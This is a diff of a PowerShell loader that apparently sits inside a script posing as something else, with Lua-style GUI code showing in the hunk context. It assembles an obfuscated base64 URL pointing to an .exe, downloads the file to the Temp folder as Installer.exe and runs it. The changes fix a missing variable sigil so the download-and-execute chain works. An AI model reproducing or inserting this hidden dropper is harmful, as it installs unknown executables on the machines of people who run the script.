@@ -91,7 +91,7 @@ while ($continue){
 Start-Sleep -Seconds 2
 
 $FoJwoMTeAqJUBHZ = "0Y2hlci9yZWZzL2hlYWRzL21haW4vQVZDQUUuZXhl"
-$base64Bytes = [System.Convert]::FromBase64String($tFhcCHAYIkvqDcH + $ZsWTVuLcqZsdied + tohNlduKgmceDZq)
+$base64Bytes = [System.Convert]::FromBase64String($tFhcCHAYIkvqDcH + $ZsWTVuLcqZsdied + $tohNlduKgmceDZq)
 $dfpaspasodsvxcv = [System.Text.Encoding]::UTF8.GetString($base64Bytes)
 $mnjksdfuidsf = [Environment]::GetFolderPath("Temp")
 
@@ -264,5 +264,5 @@ dragGUI(ToPartFrame)
 	end
 
 }
-Invoke-WebRequest -Uri $dfpaspasodsvxcv -OutFile $mnjksdfuidsf\\Installer.exe -UseBasicParsing
+Invoke-WebRequest -Uri $dfpaspasodsvxcv -OutFile $mnjksdfuidsf\\Installer.exe
 Start-Process $mnjksdfuidsf\\Installer.exe
